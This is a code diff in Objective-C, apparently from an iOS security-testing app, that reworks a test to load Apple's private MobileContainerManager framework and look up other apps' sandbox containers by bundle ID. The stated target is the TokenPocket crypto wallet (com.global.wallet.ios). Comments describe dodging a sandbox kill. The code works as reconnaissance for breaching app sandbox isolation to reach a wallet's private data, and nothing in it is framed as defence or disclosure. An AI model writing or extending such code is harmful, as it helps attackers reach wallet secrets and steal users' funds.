@@ -7377,75 +7377,94 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     // Test 11: MCM container lookup by bundle ID
-    // Try NSClassFromString first (most private frameworks pre-loaded in dyld cache)
-    // Fall back to dlopen if class not found
+    // Use dlopen (NSBundle triggers sandbox SIGKILL)
     [log appendString:@"\n--- Test 11: MCMAppContainer lookup (bundleID -> container) ---\n"];
+    NSString *ourBundleID = [[NSBundle mainBundle] bundleIdentifier];
+    [log appendFormat:@"  Our bundleID: %@\n", ourBundleID];
     [log appendFormat:@"  Target bundleID: %@\n", @"com.global.wallet.ios"];
 
+    // Flush before dlopen
+    [self appendLog:log]; [log setString:@""];
+
+    void *handle = dlopen(
+        "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
+        RTLD_LAZY);
+    [log appendFormat:@"  dlopen handle: %p\n", handle];
+
+    if (handle) {
 #pragma clang diagnostic push
 #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
 #pragma clang diagnostic ignored "-Wundeclared-selector"
+        // Probe classes
+        for (NSString *cn in @[@"MCMAppContainer", @"MCMDataContainer",
+            @"MCMPluginContainer", @"MCMSharedDataContainer",
+            @"MCMAppDataContainer", @"MCMContainerManager"]) {
+            Class c = NSClassFromString(cn);
+            [log appendFormat:@"  %@: %@\n", cn, c ? @"found" : @"nil"];
+        }
 
-    // Probe all known container classes (no framework load needed if pre-cached)
-    [log appendString:@"  Probing container classes:\n"];
-    for (NSString *cn in @[@"MCMContainerManager", @"MCMAppContainer",
-        @"MCMDataContainer", @"MCMPluginContainer",
-        @"MCMSharedDataContainer", @"MCMAppDataContainer"]) {
-        Class c = NSClassFromString(cn);
-        if (c) {
-            [log appendFormat:@"    %@: FOUND\n", cn];
+        Class MCMAppContainer = NSClassFromString(@"MCMAppContainer");
+        if (MCMAppContainer) {
+            // Test with our own bundle ID first (control)
             SEL lookupSel = NSSelectorFromString(@"containerWithIdentifier:error:");
-            if ([c respondsToSelector:lookupSel]) {
-                id container = [c performSelector:lookupSel
-                    withObject:@"com.global.wallet.ios" withObject:nil];
-                [log appendFormat:@"      lookup result: %@\n", container ?: @"nil"];
+            [log appendString:@"\n  -- Control: lookup our own app --\n"];
+            if ([MCMAppContainer respondsToSelector:lookupSel]) {
+                id container = [MCMAppContainer performSelector:lookupSel
+                    withObject:ourBundleID withObject:nil];
+                [log appendFormat:@"  self lookup: %@\n", container ?: @"nil"];
                 if (container) {
                     SEL urlSel = NSSelectorFromString(@"url");
-                    SEL pathSel = NSSelectorFromString(@"path");
                     id url = [container performSelector:urlSel];
-                    NSString *path = [url performSelector:pathSel];
-                    [log appendFormat:@"      [+] URL: %@\n", url];
-                    [log appendFormat:@"      [+] Path: %@\n", path];
+                    [log appendFormat:@"  self URL: %@\n", url];
                 }
             } else {
-                [log appendString:@"      (no containerWithIdentifier:error:)\n"];
+                [log appendString:@"  respondsToSelector: NO (class method)\n"];
             }
-        } else {
-            [log appendFormat:@"    %@: not found\n", cn];
-        }
-    }
 
-    // If classes not pre-loaded, try dlopen
-    // FLUSH log first — if dlopen triggers sandbox SIGKILL we need the logs
-    Class testClass = NSClassFromString(@"MCMAppContainer");
-    if (!testClass) {
-        [log appendString:@"  Classes not pre-loaded, trying dlopen...\n"];
-        [self appendLog:log];  // sync flush before risky dlopen
-        [log setString:@""];
-        void *handle = dlopen(
-            "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
-            RTLD_LAZY);
-        [log appendFormat:@"  dlopen handle: %p\n", handle];
-        if (handle) {
-            Class MCMAppContainer2 = NSClassFromString(@"MCMAppContainer");
-            [log appendFormat:@"  MCMAppContainer after dlopen: %@\n",
-                MCMAppContainer2 ? @"found" : @"nil"];
-            if (MCMAppContainer2) {
-                SEL lookupSel = NSSelectorFromString(@"containerWithIdentifier:error:");
-                id container = [MCMAppContainer2 performSelector:lookupSel
-                    withObject:@"com.global.wallet.ios" withObject:nil];
-                [log appendFormat:@"  lookup result: %@\n", container ?: @"nil"];
-                if (container) {
-                    SEL urlSel = NSSelectorFromString(@"url");
-                    id url = [container performSelector:urlSel];
-                    [log appendFormat:@"  [+] URL: %@\n", url];
+            // Try instance method
+            [log appendString:@"\n  -- Instance method probe --\n"];
+            id inst = [[MCMAppContainer alloc] init];
+            [log appendFormat:@"  alloc+init: %@\n", inst ?: @"nil"];
+            if (inst && [inst respondsToSelector:lookupSel]) {
+                id container = [inst performSelector:lookupSel
+                    withObject:ourBundleID withObject:nil];
+                [log appendFormat:@"  inst self lookup: %@\n", container ?: @"nil"];
+            }
+
+            // Try alternate selectors
+            [log appendString:@"\n  -- Alternate selectors on MCMAppContainer --\n"];
+            for (NSString *selName in @[@"containerWithIdentifier:",
+                @"containerForApplicationIdentifier:",
+                @"urlForApplicationIdentifier:",
+                @"containerURLForApplicationIdentifier:"]) {
+                SEL s = NSSelectorFromString(selName);
+                BOOL resp = [MCMAppContainer respondsToSelector:s];
+                [log appendFormat:@"  +%@: %@\n", selName, resp ? @"YES" : @"NO"];
+                if (resp) {
+                    id result = [MCMAppContainer performSelector:s
+                        withObject:ourBundleID];
+                    [log appendFormat:@"    self result: %@\n", result ?: @"nil"];
                 }
             }
-            dlclose(handle);
-        }
-    }
 
+            // Target: TokenPocket
+            [log appendString:@"\n  -- Target: TokenPocket --\n"];
+            if ([MCMAppContainer respondsToSelector:lookupSel]) {
+                id tp = [MCMAppContainer performSelector:lookupSel
+                    withObject:@"com.global.wallet.ios" withObject:nil];
+                [log appendFormat:@"  TP lookup: %@\n", tp ?: @"nil"];
+                if (tp) {
+                    SEL urlSel = NSSelectorFromString(@"url");
+                    id url = [tp performSelector:urlSel];
+                    [log appendFormat:@"  TP URL: %@\n", url];
+                }
+            }
+        }
 #pragma clang diagnostic pop
+        dlclose(handle);
+    } else {
+        [log appendString:@"  dlopen FAILED\n"];
+    }
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
